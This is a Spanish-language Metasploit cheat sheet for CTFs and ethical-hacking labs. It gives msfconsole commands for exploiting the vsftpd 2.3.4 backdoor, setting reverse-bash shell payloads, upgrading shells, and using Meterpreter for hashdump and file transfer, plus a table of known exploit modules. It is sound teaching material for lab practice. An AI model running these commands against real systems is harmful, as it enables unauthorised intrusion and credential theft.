# 🎯 METASPLOIT - Framework de Explotación

> Framework de código abierto para desarrollo y ejecución de exploits.  
> Usado en auditorías de seguridad y laboratorios de hacking ético.

---

## ⚡ Flujo típico en un CTF / Lab

```
1. Identificar servicio vulnerable  →  nmap -sV
2. Buscar módulo en Metasploit      →  search <servicio>
3. Cargar el módulo                 →  use <módulo>
4. Configurar opciones              →  set RHOSTS, LHOST, etc.
5. Seleccionar payload              →  set PAYLOAD
6. Ejecutar                         →  run / exploit
7. Interactuar con la sesión        →  shell, meterpreter
```

---

## 🔧 Comandos básicos de msfconsole

```bash
# Arrancar Metasploit
msfconsole

# Buscar módulos
search vsftpd
search type:exploit platform:linux

# Cargar módulo
use exploit/unix/ftp/vsftpd_234_backdoor
use 0   # por número del resultado

# Ver opciones del módulo
show options
info

# Configurar opciones
set RHOSTS 192.168.0.10
set LHOST 192.168.0.13
set LPORT 4444

# Ver payloads compatibles
show payloads

# Seleccionar payload
set PAYLOAD cmd/unix/reverse_bash

# Ejecutar
run
exploit

# Volver al menú principal
back

# Salir
exit
```

---

## 🚩 Opciones más comunes

| Opción | Descripción |
|--------|-------------|
| `RHOSTS` | IP del objetivo (Remote HOST) |
| `RPORT` | Puerto del objetivo |
| `LHOST` | Tu IP (Local HOST) — para reverse shells |
| `LPORT` | Tu puerto de escucha (por defecto 4444) |
| `PAYLOAD` | Payload a usar |
| `TARGET` | Versión específica del objetivo |

---

## 🐚 Tipos de payload

| Tipo | Descripción |
|------|-------------|
| `reverse_tcp` | La víctima conecta a ti ⭐ más usado |
| `bind_tcp` | Tú conectas a la víctima |
| `reverse_bash` | Shell bash inversa (simple y efectiva) |
| `meterpreter/reverse_tcp` | Meterpreter — más potente que shell |
| `cmd/unix/reverse_bash` | Shell bash por /dev/tcp |

---

## 🎮 Dentro de una sesión

```bash
# Ver sesiones abiertas
sessions -l

# Interactuar con sesión
sessions -i 1

# En shell básica — mejorar a TTY interactiva
python3 -c 'import pty; pty.spawn("/bin/bash")'

# En Meterpreter — comandos útiles
sysinfo          # info del sistema
getuid           # usuario actual
shell            # abrir shell del sistema
upload archivo   # subir archivo
download archivo # bajar archivo
hashdump         # extraer hashes de contraseñas
```

---

## 🔍 Exploits famosos en CTFs

| Módulo | Vulnerabilidad | Descripción |
|--------|---------------|-------------|
| `unix/ftp/vsftpd_234_backdoor` | CVE-2011-2523 | Backdoor en vsftpd 2.3.4 → root |
| `unix/misc/distcc_exec` | CVE-2004-2687 | RCE en distcc |
| `multi/handler` | - | Listener para reverse shells |
| `linux/local/dirty_cow` | CVE-2016-5195 | Escalada de privilegios kernel |
| `multi/http/struts2_045` | CVE-2017-5638 | Apache Struts RCE |

---

## 📋 Comandos de búsqueda útiles

```bash
# Buscar por CVE
search cve:2011-2523

# Buscar por plataforma
search platform:linux type:exploit

# Buscar por puerto/servicio
search name:ftp
search name:ssh
search name:http

# Ver módulos auxiliares (scanners)
search type:auxiliary name:scanner
```

---

## ⚠️ Notas importantes

- `LHOST` siempre debe ser tu IP en la red del laboratorio
- `reverse_bash` funciona bien en Linux cuando otros payloads fallan
- El warning de collation de PostgreSQL es inofensivo
- En Docker, los payloads reverse suelen funcionar mejor que bind
- Siempre hacer `back` antes de cargar otro módulo

---

## 🔗 Referencias

- Documentación oficial: https://docs.metasploit.com
- Exploit-DB: https://www.exploit-db.com
- CVE Details: https://www.cvedetails.com